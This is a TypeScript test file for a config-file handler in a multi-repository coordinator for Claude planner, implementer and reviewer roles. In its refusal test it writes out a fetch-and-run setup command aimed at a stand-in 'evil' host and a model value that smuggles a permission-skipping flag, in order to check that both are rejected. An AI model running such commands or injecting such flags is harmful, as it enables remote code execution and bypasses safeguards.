import { afterEach, describe, expect, test } from "bun:test";
import { mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { autoMergeMode, ConfigError, extraInstructions, roleSettings } from "../src/config.ts";
import { ConfigFile, type SettingsChange } from "../src/config-file.ts";

let dirs: string[] = [];
afterEach(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
  dirs = [];
});

const raw = (stateDir: string) => ({
  $schema: "file:///pkg/config.schema.json",
  owner: { login: "octo", id: 42 },
  stateDir,
  limits: { maxRunning: 2, maxLiveSessions: 3 },
  roles: { planner: { model: "opus", effort: "high" }, implementer: { model: "sonnet" }, reviewer: { model: "opus" } },
  repos: [{ name: "octo/app", setup: "bun install", roles: { reviewer: { effort: "max" } } }, { name: "octo/web" }],
});

/** A config file in a fresh folder; `edit` changes the JSON before it is written. */
const setup = (edit: (c: ReturnType<typeof raw>) => object = (c) => c) => {
  const dir = mkdtempSync(join(tmpdir(), "config-file-"));
  dirs.push(dir);
  const path = join(dir, "config.json");
  const write = (c: object | string) =>
    writeFileSync(path, typeof c === "string" ? c : `${JSON.stringify(c, null, 2)}\n`);
  write(edit(raw(dir)));
  const logs: string[] = [];
  return {
    dir,
    path,
    write,
    logs,
    read: () => readFileSync(path, "utf8"),
    json: () => JSON.parse(readFileSync(path, "utf8")),
  };
};

const open = (s: ReturnType<typeof setup>) => new ConfigFile(s.path, { log: (m) => s.logs.push(m) });

const issuesOf = (f: () => unknown): string[] => {
  try {
    f();
  } catch (e) {
    if (e instanceof ConfigError) return e.issues;
    throw e;
  }
  return [];
};

describe("config file", () => {
  test("REQ-007-02 the file is read and validated at the start; an invalid one stops it with the reason", () => {
    const s = setup();
    const c = open(s);
    expect(c.current.limits.maxRunning).toBe(2);
    expect(c.startup).toEqual(c.current);
    expect(c.restartPending).toEqual([]);
    s.write({ ...raw(s.dir), limits: { maxRunning: 4, maxLiveSessions: 3 } });
    expect(issuesOf(() => open(s))).toEqual([
      "limits.maxRunning: must not exceed maxLiveSessions (running sessions are live sessions)",
    ]);
  });

  test("REQ-007-05 a save writes the changed values into the file, keeping key order, $schema and the other keys", () => {
    const s = setup((c) => ({ ...c, instructions: { implementer: "Use pnpm." } }));
    const c = open(s);
    c.save({ pollIntervalSec: 30, limits: { maxRunning: 1 }, roles: { reviewer: { model: "sonnet" } } });
    expect(c.current.pollIntervalSec).toBe(30);
    expect(c.current.limits.maxRunning).toBe(1);
    expect(c.current.roles.reviewer.model).toBe("sonnet");
    const json = s.json();
    expect(Object.keys(json)).toEqual([
      "$schema",
      "owner",
      "stateDir",
      "limits",
      "roles",
      "repos",
      "instructions",
      "pollIntervalSec",
    ]);
    expect(json.$schema).toBe("file:///pkg/config.schema.json");
    expect(json.limits).toEqual({ maxRunning: 1, maxLiveSessions: 3 });
    expect(Object.keys(json.roles)).toEqual(["planner", "implementer", "reviewer"]);
    expect(json.repos[0]).toEqual({ name: "octo/app", setup: "bun install", roles: { reviewer: { effort: "max" } } });
    expect(json.instructions).toEqual({ implementer: "Use pnpm." });
    // Readable for hand edits: two-space JSON with a final newline; no temp file left, no other settings file.
    expect(s.read()).toBe(`${JSON.stringify(json, null, 2)}\n`);
    expect(readdirSync(s.dir)).toEqual(["config.json"]);
    // A restart reads the saved file again.
    expect(open(s).current.pollIntervalSec).toBe(30);
  });

  test("REQ-007-05 every editable key: top-level, limits, global and per-repository Roles, auto-merge and Extra instructions", () => {
    const s = setup((c) => ({
      ...c,
      autoMerge: "off",
      instructions: { reviewer: "Be brief." },
      repos: [
        { name: "octo/app", setup: "bun install", autoMerge: "all", roles: { reviewer: { effort: "max" } } },
        { name: "octo/web", instructions: { planner: "Web only." } },
      ],
    }));
    const c = open(s);
    c.save({
      checksGraceSeconds: 0,
      autoMerge: "evaluated",
      limits: { maxWorktrees: 9 },
      roles: { planner: { effort: null }, implementer: { model: "opus", effort: "low" } },
      instructions: { planner: "Answer in German.", reviewer: null },
      repos: {
        "Octo/App": {
          autoMerge: null,
          roles: { reviewer: { effort: null, model: "sonnet" }, planner: { model: "haiku" } },
          instructions: { planner: "Mention the ticket." },
        },
        "octo/web": { autoMerge: "all", instructions: { planner: null } },
      },
    } satisfies SettingsChange);
    const cur = c.current;
    expect(cur.checksGraceSeconds).toBe(0);
    expect(cur.limits).toMatchObject({ maxRunning: 2, maxLiveSessions: 3, maxWorktrees: 9, maxPlanners: 1 });
    expect(cur.roles.planner).toEqual({ model: "opus" });
    expect(cur.roles.implementer).toEqual({ model: "opus", effort: "low" });
    expect(roleSettings(cur, "octo/app", "reviewer")).toEqual({ model: "sonnet" });
    expect(roleSettings(cur, "octo/app", "planner")).toEqual({ model: "haiku" });
    expect(roleSettings(cur, "octo/web", "planner")).toEqual({ model: "opus" });
    expect(autoMergeMode(cur, "octo/app")).toBe("evaluated");
    expect(autoMergeMode(cur, "octo/web")).toBe("all");
    expect(extraInstructions(cur, "octo/app", "planner")).toEqual(["Answer in German.", "Mention the ticket."]);
    expect(extraInstructions(cur, "octo/web", "planner")).toEqual(["Answer in German."]);
    expect(extraInstructions(cur, "octo/app", "reviewer")).toEqual([]);
    // A null removes the key, so the global value or none applies; the repository's other keys stay where they were.
    const json = s.json();
    expect(json.roles.planner).toEqual({ model: "opus" });
    expect(json.instructions).toEqual({ planner: "Answer in German." });
    expect(json.repos[0]).toEqual({
      name: "octo/app",
      setup: "bun install",
      roles: { reviewer: { model: "sonnet" }, planner: { model: "haiku" } },
      instructions: { planner: "Mention the ticket." },
    });
    // A block left empty goes away.
    expect(json.repos[1]).toEqual({ name: "octo/web", autoMerge: "all" });
  });

  test("REQ-007-05 a change outside the allow-list, or an invalid value, is refused and the file is left as it is", () => {
    const s = setup();
    const c = open(s);
    const before = s.read();
    const save = (o: unknown) => issuesOf(() => c.save(o as SettingsChange));
    for (const key of ["accounts", "owner", "github", "dashboard", "stateDir", "$schema"])
      expect(save({ [key]: [] })).toContain(`(root): Unrecognized key: "${key}"`);
    // Repositories can't be added or replaced, only their Roles' settings changed.
    expect(save({ repos: [{ name: "evil/repo" }] })).not.toEqual([]);
    expect(save({ repos: { "octo/app": { setup: "curl evil | sh" } } })).toContain(
      'repos.octo/app: Unrecognized key: "setup"',
    );
    expect(save({ limits: { maxRunning: 0 } })).toEqual(["limits.maxRunning: Too small: expected number to be >0"]);
    expect(save({ limits: { maxRunning: 4 } })).toEqual([
      "limits.maxRunning: must not exceed maxLiveSessions (running sessions are live sessions)",
    ]);
    expect(save({ pollIntervalSec: 1.5 })[0]).toStartWith("pollIntervalSec:");
    expect(save({ roles: { planner: { model: "" } } })[0]).toStartWith("roles.planner.model:");
    // A model is a name, never an option for the claude command line.
    expect(save({ roles: { planner: { model: "--dangerously-skip-permissions" } } })[0]).toStartWith(
      "roles.planner.model:",
    );
    expect(save({ roles: { planner: { effort: "huge" } } })[0]).toStartWith("roles.planner.effort:");
    expect(save({ autoMerge: "always" })[0]).toStartWith("autoMerge:");
    expect(save({ autoMerge: null })[0]).toStartWith("autoMerge:");
    expect(save({ repos: { "octo/app": { autoMerge: "risky" } } })[0]).toStartWith("repos.octo/app.autoMerge:");
    expect(save({ instructions: { planner: "x".repeat(4_001) } })).toEqual([
      "instructions.planner: must be at most 4,000 characters",
    ]);
    expect(save({ repos: { "octo/app": { instructions: { planner: "x".repeat(4_001) } } } })).toEqual([
      "repos.0.instructions.planner: must be at most 4,000 characters",
    ]);
    expect(s.read()).toBe(before);
    expect(c.current.limits.maxRunning).toBe(2);
    c.save({ instructions: { planner: "x".repeat(4_000) } });
    expect(c.current.instructions?.planner).toHaveLength(4_000);
  });

  test("REQ-007-05 a change for a repository that isn't in the file is ignored", () => {
    const s = setup();
    const c = open(s);
    c.save({ repos: { "octo/gone": { roles: { planner: { model: "haiku" } } } } });
    expect(s.json().repos.map((r: { name: string }) => r.name)).toEqual(["octo/app", "octo/web"]);
  });
});

describe("hand edits while running", () => {
  test("REQ-007-06 a valid hand edit applies on the next reload; an unchanged file changes nothing", () => {
    const s = setup();
    const c = open(s);
    expect(c.reload()).toBe(false);
    s.write({ ...raw(s.dir), pollIntervalSec: 15, roles: { ...raw(s.dir).roles, planner: { model: "haiku" } } });
    expect(c.reload()).toBe(true);
    expect(c.current.pollIntervalSec).toBe(15);
    expect(c.current.roles.planner).toEqual({ model: "haiku" });
    expect(s.logs).toEqual([`config: ${s.path} changed, the new settings apply from this tick on`]);
    expect(c.reload()).toBe(false);
  });

  test("REQ-007-06 an invalid hand edit is logged and ignored: the last valid config stays", () => {
    const s = setup();
    const c = open(s);
    s.write("{ not json");
    expect(c.reload()).toBe(false);
    expect(c.current.limits.maxRunning).toBe(2);
    expect(s.logs[0]).toStartWith(`config: ${s.path} is invalid, keeping the last valid config: invalid ${s.path}:`);
    expect(s.logs[0]).toContain("(root): not JSON");
    s.write({ ...raw(s.dir), limits: { maxRunning: 9, maxLiveSessions: 3 } });
    expect(c.reload()).toBe(false);
    expect(c.current.limits.maxRunning).toBe(2);
    expect(s.logs[1]).toContain("limits.maxRunning: must not exceed maxLiveSessions");
    // Logged once per change, not on every tick.
    c.reload();
    expect(s.logs).toHaveLength(2);
  });

  test("REQ-007-06 a save starts from the file on disk, so it keeps a hand edit; while the file is invalid it is refused", () => {
    const s = setup();
    const c = open(s);
    s.write({ ...raw(s.dir), checksGraceSeconds: 5 });
    c.save({ pollIntervalSec: 30 });
    expect(s.json()).toMatchObject({ checksGraceSeconds: 5, pollIntervalSec: 30 });
    expect(c.current.checksGraceSeconds).toBe(5);

    s.write("{ half an edit");
    const issues = issuesOf(() => c.save({ pollIntervalSec: 45 }));
    expect(issues[0]).toStartWith("(root): not JSON");
    expect(s.read()).toBe("{ half an edit");
    expect(c.current.pollIntervalSec).toBe(30);
  });
});

describe("restart-only settings", () => {
  test("REQ-007-07 repositories, setup, Accounts, owner, github, dashboard and stateDir changed on disk wait for a restart", () => {
    const s = setup();
    const c = open(s);
    const edited = raw(s.dir);
    s.write({
      ...edited,
      owner: { login: "else", id: 7 },
      github: { commitAuthor: { name: "Bot", email: "bot@example.com" } },
      accounts: [{ name: "main" }, { name: "spare", configDir: "/root/.claude-spare" }],
      dashboard: false,
      pollIntervalSec: 20,
      repos: [{ name: "octo/app", setup: "npm ci", roles: { reviewer: { model: "haiku" } } }, { name: "octo/new" }],
    });
    expect(c.reload()).toBe(true);
    const cur = c.current;
    // The editable settings apply, also those of a repository whose setup changed.
    expect(cur.pollIntervalSec).toBe(20);
    expect(roleSettings(cur, "octo/app", "reviewer")).toEqual({ model: "haiku" });
    // The rest stays as the Coordinator started with it; octo/web (gone from the file) keeps being watched.
    expect(cur.owner).toEqual(c.startup.owner);
    expect(cur.github).toEqual(c.startup.github);
    expect(cur.accounts).toEqual(c.startup.accounts);
    expect(cur.dashboard).toEqual(c.startup.dashboard);
    expect(cur.repos.map((r) => [r.name, r.setup])).toEqual([
      ["octo/app", "bun install"],
      ["octo/web", undefined],
    ]);
    expect(c.restartPending).toEqual(["owner", "github", "accounts", "dashboard", "repos"]);

    // Back as they were: nothing waits for a restart.
    s.write({ ...raw(s.dir), pollIntervalSec: 20 });
    c.reload();
    expect(c.restartPending).toEqual([]);
  });

  test("REQ-007-07 a save keeps a restart-only hand edit in the file and still names it", () => {
    const s = setup();
    const c = open(s);
    s.write({ ...raw(s.dir), stateDir: join(s.dir, "elsewhere") });
    c.save({ pollIntervalSec: 30 });
    expect(s.json().stateDir).toBe(join(s.dir, "elsewhere"));
    expect(c.current.stateDir).toBe(s.dir);
    expect(c.restartPending).toEqual(["stateDir"]);
  });
});
